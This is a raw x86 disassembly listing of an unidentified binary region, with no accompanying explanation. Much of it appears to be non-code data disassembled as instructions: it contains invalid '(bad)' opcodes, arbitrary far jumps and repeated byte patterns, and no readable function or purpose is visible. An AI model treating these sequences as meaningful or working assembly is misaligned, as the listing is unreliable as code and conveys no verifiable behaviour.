  40f690:	add    BYTE PTR [ecx+0x62],al
  40f693:	bound  eax,QWORD PTR [eax]
  40f695:	int3   
  40f696:	inc    eax
  40f697:	inc    ebx
  40f698:	add    eax,0x43624041
  40f69d:	adc    BYTE PTR [ecx+0x5],al
  40f6a0:	inc    eax
  40f6a1:	shr    BYTE PTR [edx],0x6f
  40f6a4:	mov    esp,0x6d405352
  40f6a9:	sbb    al,BYTE PTR [edx+0x42]
  40f6ac:	inc    ebp
  40f6ad:	xor    al,0xae
  40f6af:	inc    eax
  40f6b0:	ret    0x296f
  40f6b3:	xor    edi,eax
  40f6b5:	inc    eax
  40f6b6:	sub    BYTE PTR [eax+0x36],al
  40f6b9:	bound  eax,QWORD PTR [ebx+0x40]
  40f6bc:	adc    BYTE PTR ds:0x4158cc40,al
  40f6c2:	inc    ebx
  40f6c3:	bound  eax,QWORD PTR [ecx+0x40]
  40f6c6:	add    eax,0x4140
  40f6cb:	and    eax,0x40400062
  40f6d0:	add    eax,0x84404340
  40f6d5:	int3   
  40f6d6:	js     0x40f6d8
  40f6d8:	inc    ecx
  40f6d9:	adc    BYTE PTR [edx+0xf],ah
  40f6dc:	(bad)  
  40f6dd:	and    al,0x44
  40f6df:	pop    ebp
  40f6e0:	mov    al,0x44
  40f6e2:	inc    eax
  40f6e3:	inc    edi
  40f6e4:	push   ebp
  40f6e5:	bound  eax,QWORD PTR [esi+0x4c]
  40f6e8:	cmp    eax,0xc1c03001
  40f6ed:	inc    eax
  40f6ee:	mov    DWORD PTR [ebp-0x3d],edi
  40f6f1:	inc    esp
  40f6f2:	jmp    0x9270:0x7a42eb32
  40f6f9:	inc    eax
  40f6fa:	je     0x40f75e
  40f6fc:	outs   dx,BYTE PTR ds:[esi]
  40f6fd:	inc    eax
  40f6fe:	xor    eax,0xfd20bfb3
  40f703:	ret    0x46ca
  40f706:	inc    esi
  40f707:	xor    BYTE PTR [eax+0x6b],dl
  40f70a:	add    BYTE PTR [eax+0x41],al
  40f70d:	inc    eax
  40f70e:	inc    ebx
  40f70f:	bound  ax,DWORD PTR ds:0x40434100
  40f716:	add    eax,0x40054062
  40f71b:	bound  eax,QWORD PTR [ecx+0x40]
  40f71e:	inc    ebx
  40f71f:	inc    eax
  40f720:	add    eax,0x25405841
  40f725:	bound  eax,QWORD PTR [eax+0x43]
  40f728:	inc    eax
  40f729:	adc    bh,dh
  40f72b:	cmp    DWORD PTR [edx],esi
  40f72d:	inc    ecx
  40f72e:	mov    eax,0xca644668
  40f733:	jmp    0x4341:0xb83d4a59
  40f73a:	adc    BYTE PTR [edx],0xc0
  40f73d:	adc    bl,al
  40f73f:	add    eax,0xc149e130
  40f744:	inc    eax
  40f745:	inc    ecx
  40f746:	inc    ebx
  40f747:	inc    eax
  40f748:	add    eax,0x43406262
  40f74d:	inc    ecx
  40f74e:	adc    BYTE PTR [eax],al
  40f750:	inc    eax
  40f751:	add    eax,0x43000562
  40f756:	add    BYTE PTR [ecx+0x40],al
  40f759:	inc    eax
  40f75a:	add    eax,0x400062
  40f75f:	inc    ebx
  40f760:	inc    eax
  40f761:	js     0x40f7a4
  40f763:	inc    ecx
  40f764:	bound  eax,QWORD PTR [eax+0x37]
  40f767:	push   0x0
  40f769:	retf   
  40f76a:	xor    BYTE PTR [esi+0x71],0x56
  40f76e:	pop    ecx
  40f76f:	das    
  40f770:	stos   DWORD PTR es:[edi],eax
  40f771:	test   BYTE PTR [eax-0x3a3f13c7],ch
  40f777:	and    BYTE PTR [ebx+ebp*4],al
  40f77a:	adc    DWORD PTR [edx+0x21052905],esi
  40f780:	stos   DWORD PTR es:[edi],eax
  40f781:	add    DWORD PTR [eax+ebp*1-0xf3eacb7],esi
  40f788:	bound  eax,QWORD PTR [eax+0x5]
  40f78b:	inc    ecx
  40f78c:	add    BYTE PTR [ebx+0x40],al
  40f78f:	inc    eax
  40f790:	inc    ecx
  40f791:	inc    eax
  40f792:	inc    eax
  40f793:	bound  eax,QWORD PTR ds:0x5624300
  40f799:	add    BYTE PTR [eax+0x40],al
  40f79c:	add    BYTE PTR [ecx+0x43],al
  40f79f:	add    BYTE PTR [eax+0x41],al
  40f7a2:	add    eax,0x40436200
  40f7a7:	inc    eax
  40f7a8:	add    eax,0x41744062
  40f7ad:	inc    ecx
  40f7ae:	mov    eax,0x4440d464
  40f7b4:	add    cl,cl
  40f7b6:	add    ah,BYTE PTR [edx]
  40f7b8:	ret    
  40f7b9:	mov    al,BYTE PTR [eax-0x27]
  40f7bc:	aam    0x43
  40f7be:	mov    esi,0x43a85440
  40f7c3:	sbb    al,0x44
  40f7c5:	inc    esp
  40f7c6:	inc    ecx
  40f7c7:	mov    edx,0x52f812c0
  40f7cc:	sub    al,0x41
  40f7ce:	inc    eax
  40f7cf:	add    eax,0x41624340
  40f7d4:	test   BYTE PTR [eax],al
  40f7d6:	and    eax,0x404043
  40f7db:	add    BYTE PTR ds:0x626210,al
  40f7e1:	add    eax,0x43404140
  40f7e6:	inc    eax
  40f7e7:	inc    ecx
  40f7e8:	add    eax,0x10664062
  40f7ed:	inc    ebx
  40f7ee:	bound  ebp,QWORD PTR [eax+eax*2]
  40f7f1:	pop    eax
  40f7f2:	out    dx,eax
  40f7f3:	dec    eax
  40f7f4:	inc    edi
  40f7f5:	inc    edx
  40f7f6:	(bad)  
  40f7f7:	dec    ebp
  40f7f8:	inc    eax
  40f7f9:	shl    DWORD PTR [ecx+eax*2],0x35
  40f7fd:	xchg   esp,eax
  40f7fe:	inc    esp
  40f7ff:	retf   
  40f800:	inc    eax
  40f801:	xchg   ecx,eax
  40f802:	fadd   DWORD PTR [edi]
  40f804:	inc    edx
  40f805:	or     al,0x2d
  40f807:	dec    eax
  40f808:	dec    esp
  40f809:	pusha  
  40f80a:	shl    DWORD PTR [eax-0x1134bb44],0x40
  40f811:	push   ebx
  40f812:	dec    ebp
  40f813:	add    eax,0x4041cc
  40f818:	add    BYTE PTR [eax],al
  40f81a:	inc    eax
  40f81b:	inc    eax
  40f81c:	inc    ebx
  40f81d:	bound  eax,QWORD PTR [eax]
  40f81f:	inc    eax
  40f820:	inc    eax
  40f821:	add    eax,0x62434162
  40f826:	inc    eax
  40f827:	js     0x40f839
  40f829:	inc    ecx
  40f82a:	add    eax,0x5404325
  40f82f:	bound  eax,QWORD PTR [eax+0x40]
  40f832:	inc    ecx
  40f833:	inc    ebx
  40f834:	bound  edi,QWORD PTR ds:0x407dc251
  40f83a:	dec    eax
  40f83b:	ret    
  40f83c:	mov    eax,0xa80169c3
  40f841:	inc    eax
  40f842:	rcl    BYTE PTR [ecx],0xe8
  40f845:	dec    ebp
  40f846:	xchg   BYTE PTR [ebx+0x12],ah
  40f849:	pop    eax
  40f84a:	js     0x40f80c
  40f84c:	add    ch,BYTE PTR [ebx+0x40bc05c3]
  40f852:	inc    eax
  40f853:	and    eax,0x87b01398
  40f858:	adc    eax,0x7e3e7440
  40f85d:	stos   DWORD PTR es:[edi],eax
  40f85e:	retf   
  40f85f:	inc    edi
  40f860:	retf   
  40f861:	inc    eax
  40f862:	inc    eax
  40f863:	shl    DWORD PTR ds:0x436241,0x10
  40f86a:	inc    eax
  40f86b:	add    BYTE PTR ds:0x62410040,al
  40f871:	inc    eax
  40f872:	add    BYTE PTR [ebx-0x34],al
  40f875:	inc    eax
  40f876:	add    eax,0x78434040
  40f87b:	bound  eax,QWORD PTR [ecx+0x78]
  40f87e:	add    eax,0x62404043
  40f883:	rol    BYTE PTR [edi+0x41],1
  40f886:	add    eax,0x64705458
  40f88b:	ja     0x40f8cd
  40f88d:	inc    ebp
  40f88e:	dec    DWORD PTR [eax+eax*2+0x60]
  40f892:	ror    ah,0x8e
  40f895:	loopne 0x40f8d8
  40f897:	inc    eax
  40f898:	add    eax,0x43436240
  40f89d:	add    eax,0x62004040
  40f8a2:	inc    eax
  40f8a3:	add    BYTE PTR [ecx+0x40],al
  40f8a6:	inc    ebx
  40f8a7:	test   BYTE PTR ds:0x58054041,ah
  40f8ad:	inc    eax
  40f8ae:	inc    eax
  40f8af:	bound  eax,QWORD PTR [eax+0x66]
  40f8b2:	inc    ecx
  40f8b3:	inc    eax
  40f8b4:	add    eax,0x404d0d00
  40f8b9:	inc    eax
  40f8ba:	pusha  
  40f8bb:	fcomp  st(4)
  40f8bd:	and    cl,cl
  40f8bf:	arpl   WORD PTR [eax+0x72],ax
  40f8c2:	ss test eax,0x28a46049
  40f8c8:	push   eax
  40f8c9:	inc    eax
  40f8ca:	jge    0x40f87c
  40f8cc:	xor    eax,0x40400dd1
  40f8d1:	ins    DWORD PTR es:[edi],dx
  40f8d2:	les    ecx,FWORD PTR [esi+0x40cb6b41]
  40f8d8:	inc    eax
  40f8d9:	inc    eax
  40f8da:	ss (bad) 
  40f8dc:	mov    esp,0x40430000
  40f8e1:	bound  eax,QWORD PTR ds:0x25404110
  40f8e7:	add    ah,cl
  40f8e9:	inc    ebx
  40f8ea:	add    eax,0x40402562
  40f8ef:	add    BYTE PTR [eax+0x40],al
  40f8f2:	inc    ecx
  40f8f3:	inc    ecx
  40f8f4:	add    eax,0x78434025
  40f8f9:	bound  eax,QWORD PTR [eax-0x7c]
  40f8fc:	inc    eax
  40f8fd:	inc    ecx
  40f8fe:	inc    esp
  40f8ff:	mov    esp,0x13014053
  40f904:	ins    DWORD PTR es:[edi],dx
  40f905:	cmp    eax,0x4c710551
  40f90a:	inc    eax
  40f90b:	enter  0xc334,0x7a
  40f90f:	leave  
  40f910:	lds    eax,FWORD PTR [eax+0x13]
  40f913:	add    al,0xb
  40f915:	pop    esp
  40f916:	inc    ecx
  40f917:	nop
  40f918:	dec    edi
  40f919:	inc    eax
  40f91a:	inc    eax
  40f91b:	xor    edi,DWORD PTR ds:0x80bfe8ab
  40f921:	inc    eax
  40f922:	inc    eax
  40f923:	ret    0x2298
  40f926:	retf   
  40f927:	inc    ecx
  40f928:	inc    eax
  40f929:	inc    eax
  40f92a:	inc    ebx
  40f92b:	int3   
  40f92c:	add    BYTE PTR ds:0x56240,al
  40f932:	inc    ebx
  40f933:	inc    eax
  40f934:	inc    eax
  40f935:	add    BYTE PTR [ecx+0x62],al
  40f938:	bound  eax,QWORD PTR [eax]
  40f93a:	int3   
  40f93b:	inc    eax
  40f93c:	inc    ebx
  40f93d:	add    eax,0x43624041
  40f942:	adc    BYTE PTR [ecx+0x5],al
  40f945:	inc    eax
  40f946:	add    al,0xc5
  40f948:	dec    eax
  40f949:	adc    dh,BYTE PTR [edx]
  40f94b:	xor    al,0xab
  40f94d:	pusha  
  40f94e:	dec    eax
  40f94f:	mov    eax,0xde45e240
  40f954:	inc    edi
  40f955:	xor    DWORD PTR [esi+0x15],ebx
  40f958:	inc    eax
  40f959:	rol    ebp,0x3c
  40f95c:	jge    0x40f9a5
  40f95e:	sub    BYTE PTR [edi+0x62c28540],bh
  40f964:	in     al,dx
  40f965:	hlt    
  40f966:	(bad)  
  40f967:	mov    edi,0x7dc1c144
  40f96c:	(bad)  
  40f96d:	(bad)  
  40f96e:	mov    bl,0x2a
  40f970:	inc    eax
  40f971:	inc    edi
  40f972:	jmp    0x40f950
  40f974:	bound  eax,QWORD PTR [ebx+0x40]
  40f977:	adc    BYTE PTR ds:0x4158cc40,al
  40f97d:	inc    ebx
  40f97e:	bound  eax,QWORD PTR [ecx+0x40]
  40f981:	add    eax,0x4140
  40f986:	and    eax,0x40400062
  40f98b:	add    eax,0x84404340
  40f990:	int3   
  40f991:	js     0x40f993
  40f993:	inc    ecx
  40f994:	adc    BYTE PTR [edx+0xf],ah
  40f997:	clc    
  40f998:	inc    esp
  40f999:	push   cs
  40f99a:	inc    esi
  40f99b:	inc    eax
  40f99c:	rol    BYTE PTR [ecx],0x40
  40f99f:	dec    ecx
  40f9a0:	push   ecx
  40f9a1:	into   
  40f9a2:	inc    eax
  40f9a3:	inc    eax
  40f9a4:	sub    al,0xc0
  40f9a6:	nop
  40f9a7:	xor    eax,0x69476270
  40f9ac:	enter  0x7d09,0x4f
  40f9b0:	add    eax,0x41400048
  40f9b5:	inc    eax
  40f9b6:	inc    ebx
  40f9b7:	bound  ax,DWORD PTR ds:0x40434100
  40f9be:	add    eax,0x40054062
  40f9c3:	bound  eax,QWORD PTR [ecx+0x40]
  40f9c6:	inc    ebx
  40f9c7:	inc    eax
  40f9c8:	add    eax,0x25405841
  40f9cd:	bound  eax,QWORD PTR [eax+0x43]
  40f9d0:	inc    eax
  40f9d1:	adc    BYTE PTR [eax],ch
  40f9d3:	adc    eax,0x3bc064c1
  40f9d8:	retf   
  40f9d9:	cld    
  40f9da:	sub    BYTE PTR [edi+ebx*8-0x3f],al
  40f9de:	mov    esi,0x406c746d
  40f9e3:	mov    edi,0x35ec63c2
  40f9e8:	stos   BYTE PTR es:[edi],al
  40f9e9:	dec    eax
  40f9ea:	sub    al,BYTE PTR [ebx+edi*2-0x3e]
  40f9ee:	mov    ah,0x45
  40f9f0:	jb     0x40f9c6
  40f9f2:	inc    eax
  40f9f3:	inc    ecx
  40f9f4:	inc    ebx
  40f9f5:	inc    eax
  40f9f6:	add    eax,0x43406262
  40f9fb:	inc    ecx
  40f9fc:	adc    BYTE PTR [eax],al
  40f9fe:	inc    eax
  40f9ff:	add    eax,0x43000562
  40fa04:	add    BYTE PTR [ecx+0x40],al
  40fa07:	inc    eax
  40fa08:	add    eax,0x400062
  40fa0d:	inc    ebx
  40fa0e:	inc    eax
  40fa0f:	js     0x40fa52
  40fa11:	inc    ecx
  40fa12:	bound  eax,QWORD PTR [eax+0x11]
  40fa15:	mov    edi,0xb8051760
  40fa1a:	lock sbb al,0xb0
  40fa1d:	inc    ebp
  40fa1e:	jbe    0x40fa61
  40fa20:	retf   
  40fa21:	inc    ecx
  40fa22:	jo     0x40fa4c
  40fa24:	or     eax,0x4246c334
  40fa29:	dec    edi
  40fa2a:	mov    eax,0x684fcdc8
  40fa2f:	pusha  
  40fa30:	out    0xc0,eax
  40fa32:	inc    ebx
  40fa33:	inc    esp
  40fa34:	inc    eax
  40fa35:	xor    al,0xc1
  40fa37:	dec    edi
  40fa38:	cwde   
  40fa39:	inc    eax
  40fa3a:	mov    esp,0x4b24403d
  40fa3f:	inc    edx
  40fa40:	test   al,0x40
  40fa42:	ins    BYTE PTR es:[edi],dx
  40fa43:	push   esp
  40fa44:	jo     0x40fa57
  40fa46:	shl    ch,0x11
  40fa49:	inc    eax
  40fa4a:	fs test al,0x40
  40fa4d:	shl    DWORD PTR [eax+0x7e],0xb8
  40fa51:	call   0xf3690266
  40fa56:	push   ebp
  40fa57:	push   ecx
  40fa58:	inc    ecx
  40fa59:	enter  0xce63,0x44
  40fa5d:	arpl   dx,ax
  40fa5f:	inc    eax
  40fa60:	xor    DWORD PTR [edx-0x6c],eax
  40fa63:	mov    eax,0x2221702a
  40fa68:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fa69:	inc    ecx
  40fa6a:	inc    esi
  40fa6b:	cmp    al,0x40
  40fa6d:	adc    edx,DWORD PTR [esi+0x40]
  40fa70:	bound  esi,QWORD PTR [ecx+edx*1]
  40fa73:	add    eax,0x7cc1f140
  40fa78:	push   eax
  40fa79:	inc    edi
  40fa7a:	bound  eax,QWORD PTR [bp+si+0x1e]
  40fa7e:	xor    eax,0x43a82055
  40fa83:	lock hlt 
  40fa85:	sbb    esp,DWORD PTR [eax+0x40]
  40fa88:	push   ecx
  40fa89:	mov    eax,0x59b028bc
  40fa8e:	ret    0xc449
  40fa91:	add    eax,0x7c050d77
  40fa96:	daa    
  40fa97:	inc    eax
  40fa98:	or     cl,cl
  40fa9a:	addr16 int 0x42
  40fa9d:	xor    eax,0x42aa04d2
  40faa2:	les    esp,FWORD PTR [ebx+0x40]
  40faa5:	push   ecx
  40faa6:	les    ecx,FWORD PTR [edx-0x28]
  40faa9:	sbb    ah,BYTE PTR [edx-0x56]
  40faac:	inc    esp
  40faad:	aas    
  40faae:	es inc eax
  40fab0:	jp     0x40fb12
  40fab2:	inc    ebx
  40fab3:	bound  edi,QWORD PTR [edi*2+0x62624dde]
  40faba:	mov    esp,0xc3401765
  40fabf:	inc    eax
  40fac0:	retf   
  40fac1:	jb     0x40fb2f
  40fac3:	dec    esp
  40fac4:	les    ecx,FWORD PTR [esp+edx*1]
  40fac7:	outs   dx,BYTE PTR ds:[esi]
  40fac8:	daa    
  40fac9:	mov    eax,0x454f628b
  40face:	ret    0x9995
  40fad1:	bound  ebx,QWORD PTR [edx+0x23d04011]
  40fad7:	inc    ebx
  40fad8:	mov    eax,fs:0x15b894a8
  40fade:	dec    eax
  40fadf:	jns    0x40fb55
  40fae1:	push   ebp
  40fae2:	adc    dl,BYTE PTR [edx+0x3d]
  40fae5:	push   eax
  40fae6:	rol    DWORD PTR [edx+0x63],0xa8
  40faea:	push   ebp
  40faeb:	cs ret 
  40faed:	shr    ebp,1
  40faef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40faf0:	dec    esp
  40faf1:	jp     0x40fb35
  40faf3:	and    edi,DWORD PTR [eax+0x4046e540]
  40faf9:	call   FWORD PTR [edi+0x38]
  40fafc:	add    eax,0x1169c1b0
  40fb01:	gs mov esp,0x47cbc943
  40fb07:	inc    ecx
  40fb08:	imul   ecx,DWORD PTR [esi+eax*2-0x3ffdb7d8],0x41
  40fb10:	push   0xffffff8c
  40fb12:	lock jl 0x40fb5d
  40fb15:	dec    esi
  40fb16:	and    al,0x40
  40fb18:	test   al,0x15
  40fb1a:	inc    ebx
  40fb1b:	test   al,0x44
  40fb1d:	shl    BYTE PTR [edx+0x2d],cl
  40fb20:	adc    dh,BYTE PTR [edx-0x44]
  40fb23:	adc    bl,ah
  40fb25:	sbb    eax,0x6ab80fc0
  40fb2a:	push   0x3640c194
  40fb2f:	inc    eax
  40fb30:	inc    ecx
  40fb31:	retf   
  40fb32:	push   ss
  40fb33:	inc    ecx
  40fb34:	dec    ebx
  40fb35:	adc    al,0x25
  40fb37:	xor    ah,BYTE PTR [eax+0x41]
  40fb3a:	pop    eax
  40fb3b:	push   ebp
  40fb3c:	rcl    DWORD PTR [ebp-0x3e],0x3d
  40fb40:	int3   
  40fb41:	leave  
  40fb42:	arpl   sp,sp
  40fb44:	cwde   
  40fb45:	shl    BYTE PTR [ebx],1
  40fb47:	inc    eax
  40fb48:	fs push esp
  40fb4a:	ds ds pusha 
  40fb4d:	adc    eax,0xd902f6f
  40fb52:	fs dec eax
  40fb54:	in     eax,0x56
  40fb56:	ror    DWORD PTR ds:0x6148cbbe,0x34
  40fb5d:	push   eax
  40fb5e:	xchg   ebp,eax
  40fb5f:	inc    eax
  40fb60:	aad    0x44
  40fb62:	js     0x40fbb7
  40fb64:	inc    ecx
  40fb65:	add    eax,0x442c9514
  40fb6a:	outs   dx,DWORD PTR ds:[esi]
  40fb6b:	jns    0x40fbb1
  40fb6d:	push   es
  40fb6e:	int    0x10
  40fb70:	cmp    al,0x0
  40fb72:	sbb    ecx,esp
  40fb74:	int3   
  40fb75:	inc    ecx
  40fb76:	pop    edi
  40fb77:	jnp    0x40fb35
  40fb79:	pusha  
  40fb7a:	mov    eax,0xc1524678
  40fb7f:	inc    ebx
  40fb80:	jg     0x40fbe5
  40fb82:	add    eax,0x7f1b3008
  40fb87:	inc    ecx
  40fb88:	test   al,0x78
  40fb8a:	retf   
  40fb8b:	dec    ebx
  40fb8c:	inc    ebp
  40fb8d:	mov    esi,0xa81240c0
  40fb92:	test   DWORD PTR [esi],ebp
  40fb94:	xchg   DWORD PTR [edi+0x12b82c25],edi
  40fb9a:	stos   DWORD PTR es:[edi],eax
  40fb9b:	pop    ss
  40fb9c:	inc    eax
  40fb9d:	inc    eax
  40fb9e:	pop    ecx
  40fb9f:	aas    
  40fba0:	adc    eax,0x40a84151
  40fba5:	inc    eax
  40fba6:	ret    0x4341
  40fba9:	retf   
  40fbaa:	pop    esp
  40fbab:	adc    BYTE PTR [ebx+0x40],dl
  40fbae:	adc    eax,0xc850641f
  40fbb3:	mov    eax,0x401d003f
  40fbb8:	cmp    al,0xd
  40fbba:	mov    eax,0xc5dcc441
  40fbbf:	and    eax,0xe0dcb62
  40fbc4:	dec    edi
  40fbc5:	add    al,0x27
  40fbc7:	jns    0x40fb91
  40fbc9:	push   ebx
  40fbca:	dec    eax
  40fbcb:	nop
  40fbcc:	inc    ebp
  40fbcd:	bnd ret 
  40fbcf:	inc    eax
  40fbd0:	sub    BYTE PTR [esi+0x42],al
  40fbd3:	adc    bl,BYTE PTR [ecx]
  40fbd5:	(bad)  
  40fbd6:	stos   DWORD PTR es:[edi],eax
  40fbd7:	sub    eax,0xe4940b06
  40fbdc:	fsub   st(6),st
  40fbde:	dec    edi
  40fbdf:	xor    edi,DWORD PTR [edi+0x30]
  40fbe2:	adc    DWORD PTR [esi],ecx
  40fbe4:	add    eax,0x777c040
  40fbe9:	arpl   WORD PTR [edi],cx
  40fbeb:	repnz leave 
  40fbed:	gs cs dec eax
  40fbf0:	bound  ebx,QWORD PTR [ecx+0x3d]
  40fbf3:	add    al,0x44
  40fbf5:	dec    ebp
  40fbf6:	inc    ebp
  40fbf7:	and    al,0x60
  40fbf9:	jg     0x40fc5d
  40fbfb:	rol    BYTE PTR [esi+0x10],1
  40fbfe:	rcl    BYTE PTR ds:0xe41ed80,0xc3
  40fc05:	inc    ecx
  40fc06:	sub    eax,0xa8666341
  40fc0b:	lock imul eax,DWORD PTR [edx+eiz*2],0xc3545467
  40fc13:	clc    
  40fc14:	adc    eax,DWORD PTR [edx-0x40]
  40fc17:	inc    edx
  40fc18:	test   al,0x7b
  40fc1a:	cwde   
  40fc1b:	add    eax,0x2c21d0f9
  40fc20:	adc    DWORD PTR [ecx-0x1],esi
  40fc23:	xchg   DWORD PTR [eax+0x3],eax
  40fc26:	push   cs
  40fc27:	push   ebx
  40fc28:	push   edx
  40fc29:	bound  esp,QWORD PTR [edx+0x40]
  40fc2c:	inc    eax
  40fc2d:	dec    ebp
  40fc2e:	rol    BYTE PTR [eax+0x10],0x83
  40fc32:	add    DWORD PTR [ecx+0x40],0xfffffff5
  40fc36:	and    esi,DWORD PTR [ebx]
  40fc38:	or     al,0x65
  40fc3a:	ret    
  40fc3b:	js     0x40fc7d
  40fc3d:	mov    dl,ch
  40fc3f:	sbb    cl,ch
  40fc41:	test   al,0x98
  40fc43:	and    al,0xb4
  40fc45:	test   DWORD PTR [ebx],0xcb7cb85f
  40fc4b:	syscall 
  40fc4d:	je     0x40fc10
  40fc4f:	inc    eax
  40fc50:	inc    ebp
  40fc51:	cmp    eax,DWORD PTR [ecx-0x74]
  40fc54:	xchg   DWORD PTR [edi+0x46],edx
  40fc57:	mov    esp,0x494562e9
  40fc5c:	push   eax
  40fc5d:	and    eax,eax
  40fc5f:	inc    eax
  40fc60:	fs adc ah,al
  40fc63:	fadd   DWORD PTR [ebp+0x13]
  40fc66:	add    eax,0x2770622c
  40fc6b:	ins    BYTE PTR es:[edi],dx
  40fc6c:	push   0x881b514b
  40fc71:	imul   ebp,DWORD PTR [eax-0x3d4a43b1],0x40621c42
  40fc7b:	hlt    
  40fc7c:	arpl   WORD PTR [edi],bx
  40fc7e:	jg     0x40fc93
  40fc80:	push   ebp
  40fc81:	aad    0x2a
  40fc83:	in     al,0x63
  40fc85:	inc    edx
  40fc86:	daa    
  40fc87:	jb     0x40fc54
  40fc89:	int    0x49
  40fc8b:	add    eax,0x45c73b50
  40fc90:	inc    ecx
  40fc91:	jp     0x40fcbd
  40fc93:	xchg   DWORD PTR [esi+0x42],esp
  40fc96:	inc    esi
  40fc97:	jbe    0x40fcb3
  40fc99:	push   ds
  40fc9a:	push   0xe
  40fc9c:	inc    eax
  40fc9d:	aas    
  40fc9e:	rol    BYTE PTR [eax+0x38],0x63
  40fca2:	cmp    eax,0x3341017b
  40fca7:	retf   
  40fca8:	call   0x9633:0x9d62a850
  40fcaf:	add    BYTE PTR ss:0x43444915,0xc7
  40fcb7:	inc    eax
  40fcb8:	sub    ecx,ebx
  40fcba:	jnp    0x40fc4c
  40fcbc:	loope  0x40fcef
  40fcbe:	inc    ecx
  40fcbf:	sub    DWORD PTR ds:0xac6eb012,esi
  40fcc5:	in     eax,0xe3
  40fcc7:	jb     0x40fd10
  40fcc9:	push   esp
  40fcca:	adc    eax,0x4419cb46
  40fccf:	inc    eax
  40fcd0:	dec    eax
  40fcd1:	adc    eax,0x571528cb
  40fcd6:	mov    bl,0x30
  40fcd8:	cmp    eax,0x45f34bcb
  40fcdd:	xchg   ebx,eax
  40fcde:	inc    eax
  40fcdf:	dec    esi
  40fce0:	ret    
  40fce1:	add    DWORD PTR [eax-0x58],edi
  40fce4:	bound  ebx,QWORD PTR [eax+0x3]
  40fce7:	inc    eax
  40fce8:	xor    DWORD PTR [ebp-0x34],eax
  40fceb:	adc    BYTE PTR [ebp+esi*4+0xbab3340],bl
  40fcf2:	push   ebp
  40fcf3:	mov    ah,0x65
  40fcf5:	jns    0x40fcf6
  40fcf7:	(bad)  
  40fcf8:	inc    edx
  40fcf9:	pusha  
  40fcfa:	repnz inc ecx
  40fcfc:	dec    eax
  40fcfd:	push   ebx
  40fcfe:	inc    ebx
  40fcff:	inc    ecx
  40fd00:	leave  
  40fd01:	arpl   sp,sp
  40fd03:	push   cs
  40fd04:	inc    ebp
  40fd05:	mov    edi,0xbcb85545
  40fd0a:	(bad)  
  40fd0b:	ror    ch,1
  40fd0d:	pop    ecx
  40fd0e:	xor    DWORD PTR [edx+0x48],0x9a42a90d
  40fd15:	push   ebx
  40fd16:	pop    DWORD PTR [ecx+0x2]
  40fd19:	leave  
  40fd1a:	aam    0x28
  40fd1c:	test   al,0x3e
  40fd1e:	inc    edx
  40fd1f:	(bad)  
  40fd20:	sbb    al,0x56
  40fd22:	mov    dl,0x12
  40fd24:	adc    BYTE PTR [esi+ebp*2+0x42],dh
  40fd28:	arpl   WORD PTR [edi],bp
  40fd2a:	fdivr  st,st(4)
  40fd2c:	mov    esp,0x482c2f21
  40fd31:	dec    edx
  40fd32:	inc    ecx
  40fd33:	adc    eax,0x4045ca05
  40fd38:	ret    0xe824
  40fd3b:	int    0xcb
  40fd3d:	repz imul esp,DWORD PTR [ecx],0x11d06cdd
  40fd44:	adc    al,BYTE PTR [edi+0x41]
  40fd47:	inc    eax
  40fd48:	arpl   WORD PTR [eax-0x58],ax
  40fd4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd4c:	push   eax
  40fd4d:	fstp   QWORD PTR [ebp+0x28]
  40fd50:	ficomp WORD PTR [edx+0x41]
  40fd53:	inc    ebp
  40fd54:	adc    eax,0x303a4004
  40fd59:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fd5a:	sub    ch,bh
  40fd5c:	retf   
  40fd5d:	xchg   edi,eax
  40fd5e:	and    DWORD PTR [eax-0x4c],eax
  40fd61:	mov    esi,0x56473810
  40fd66:	and    DWORD PTR gs:[ecx],0x465042c5
  40fd6d:	repz inc ecx
  40fd6f:	add    eax,0xc0476435
  40fd74:	loopne 0x40fde1
  40fd76:	add    DWORD PTR [esi+0x44],ecx
  40fd79:	mul    al
  40fd7b:	inc    edx
  40fd7c:	cmp    dh,BYTE PTR [edx]
  40fd7e:	inc    ecx
  40fd7f:	inc    eax
  40fd80:	inc    ecx
  40fd81:	inc    esp
  40fd82:	fld    TBYTE PTR [edx]
  40fd84:	test   al,0x9f
  40fd86:	sti    
  40fd87:	sub    eax,0x45a82c39
  40fd8c:	adc    edx,esp
  40fd8e:	dec    ebx
  40fd8f:	pop    edx
  40fd90:	or     DWORD PTR [ebp+eiz*2+0x40bf252a],edi
  40fd97:	inc    eax
  40fd98:	xor    al,0xd5
  40fd9a:	out    dx,al
  40fd9b:	add    BYTE PTR [ebx],ah
  40fd9d:	or     DWORD PTR [ecx+0x627bfc3a],esp
  40fda3:	sub    dh,BYTE PTR [edi+0x58]
  40fda6:	push   edi
  40fda7:	adc    ch,BYTE PTR [edx-0x2]
  40fdaa:	adc    DWORD PTR [ebx-0x28],eax
  40fdad:	ds inc eax
  40fdaf:	inc    esp
  40fdb0:	bound  eax,QWORD PTR [eax+edi*1+0x4c]
  40fdb4:	inc    eax
  40fdb5:	inc    edi
  40fdb6:	and    al,0x27
  40fdb8:	jle    0x40fde6
  40fdba:	bound  esi,QWORD PTR [eax+eax*4]
  40fdbd:	jmp    DWORD PTR [ebx-0x36]
  40fdc0:	hlt    
  40fdc1:	mov    edx,0x696ec9ac
  40fdc6:	inc    eax
  40fdc7:	inc    edx
  40fdc8:	push   edx
  40fdc9:	inc    eax
  40fdca:	add    eax,0x3056c680
  40fdcf:	adc    eax,0x94c9cd48
  40fdd4:	test   al,0xd3
  40fdd6:	dec    ebx
  40fdd7:	daa    
  40fdd8:	push   0x23982469
  40fddd:	and    al,BYTE PTR [edx+0x40]
  40fde0:	xor    DWORD PTR [eax-0x6ab57ff1],edi
  40fde6:	and    al,0x2e
  40fde8:	rcr    BYTE PTR [esi+0x63],1
  40fdeb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fdec:	push   0x536cea5d
  40fdf1:	xchg   ebp,eax
  40fdf2:	mov    esp,0x5173daa8
  40fdf7:	inc    ecx
  40fdf8:	test   al,0x44
  40fdfa:	bound  edx,QWORD PTR [edx]
  40fdfc:	sub    bh,dh
  40fdfe:	inc    eax
  40fdff:	push   esp
  40fe00:	adc    BYTE PTR [ecx+edx*8],ch
  40fe03:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fe04:	imul   ecx,DWORD PTR [ecx+0x39],0xbcb6ac40
  40fe0b:	inc    edx
  40fe0c:	xor    eax,0x420240b8
  40fe11:	aad    0x44
  40fe13:	push   cs
